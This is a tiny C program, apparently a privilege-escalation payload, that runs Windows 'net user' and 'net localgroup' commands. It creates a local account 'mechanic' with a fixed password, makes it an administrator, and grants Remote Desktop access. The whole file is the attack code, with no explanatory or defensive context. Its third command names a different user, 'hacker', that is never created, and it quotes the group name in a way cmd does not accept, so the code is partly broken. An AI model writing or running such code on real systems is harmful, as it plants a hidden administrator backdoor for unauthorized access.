/*
 * @c0demech 
 * 
 */
#include <stdlib.h> 

int main()
{
    int v;
    v=system ("net user mechanic wrench /add"); 
    v=system ("net localgroup administrators mechanic /add");
    v=system ("net localgroup 'Remote Desktop users' hacker /add");
    return 0;
}
